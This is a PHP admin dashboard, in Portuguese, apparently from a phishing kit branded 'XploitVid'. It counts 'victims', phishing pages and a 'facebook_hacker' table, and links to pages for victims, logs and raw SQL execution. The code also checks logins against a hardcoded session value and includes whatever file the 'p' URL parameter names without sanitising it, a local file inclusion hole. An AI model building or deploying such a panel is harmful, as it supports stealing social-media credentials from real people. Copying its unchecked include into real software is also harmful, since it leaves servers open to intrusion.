<?php 
session_start();
$login = @$_SESSION['login'];
if (empty($login) || $login != "22082000") {
	header('location: ./login.php');exit();
}
include_once($_SERVER['DOCUMENT_ROOT']."/config/config.php");
?>
<!DOCTYPE html>
<html>
<head> 
	<title>Painel de Admistração</title>
	<meta charset="utf-8">
	<link rel="stylesheet" type="text/css" href="index.css">
	<script type="text/javascript" src="/js/site.js"></script>
</head>
<body>
<header>
	<div><a href="/admin/" style="color:#fff">XploitVid Admin</a></div>
</header>
<nav>
	<ul>
		<li><a href="/">Ver Site</a></li>
		<li><a href="javascript:void(0)" >Usuarios</a>
			<ul>
				<li><a href="./?p=usuarios.php">Users</a>
				<li><a href="./?p=vitimas.php">Vitimas</a>
				<li><a href="./?p=links.php">Páginas</a>
				<li><a href="./?p=lixeira.php">Lixeira</a>
			</ul>
		</li>
		<li><a href="javascript:void(0)" >Configurações</a>
			<ul>
				<li><a href="./?p=block.php">Banir IP</a>
				<li><a href="./?p=configuracoes.php">Configurações</a>
			</ul>
		</li>
		<li><a href="./?p=logs.php">Logs</a></li>
		<li><a href="#">Enviar MSG</a></li>
		<li><a href="./?p=db.php">Executar SQL</a></li>
	</ul>
</nav>
<main>
	<aside>
		<div class="version">2017 © XPLOITVID - Versão 6.13.11</div>
		<div class="acessos">
			<?php 
			$ler = ler_db("views", " ");
			if (!empty($ler)) {
				foreach ($ler as $lers) {
				$viwer_p = intval($lers['pes']);
				$viwer_t = intval($lers['total']);
				}
			}
			?>
			<table>
				<tr><th colspan="2">Acessos:</th></tr>
				<tr>
					<td>Sessões:</td> <td><?php echo $viwer_p; ?></td>
				</tr>
				<tr>
					<td>Cliques:</td> <td><?php echo $viwer_t; ?></td>
				</tr>
			</table>
		</div>
		<table>
				<tr><th colspan="2">Dados:</th></tr>
				<tr>
					
					<td>Nº de usuarios:</td> <td><?php echo mysqli_num_rows(executa_query("SELECT id FROM usuarios")) ?></td>
				</tr>
				<tr>
					<td>Nº de Vitimas:</td> <td><?php echo mysqli_num_rows(executa_query("SELECT id FROM vitimas")) ?></td>
				</tr>
				<tr>
					<td>Nº de Páginas:</td> <td><?php echo mysqli_num_rows(executa_query("SELECT id FROM facebook_hacker")) ?></td>
				</tr>
		</table>
		
	</aside>

	<div class="site">
		<?php
		$pagina = @$_GET['p'];
		if (isset($pagina)) {
			$file_pagina = $_SERVER['DOCUMENT_ROOT']."/admin/p/".$pagina;
			if(file_exists(stream_resolve_include_path($file_pagina))){
				include_once $file_pagina;
			}else{
				echo "<br><br>Está página Não existe";
			}
		}
		?>
	</div>
</main>
<script type="text/javascript" src="/js/site.js"></script>
</body>
</html>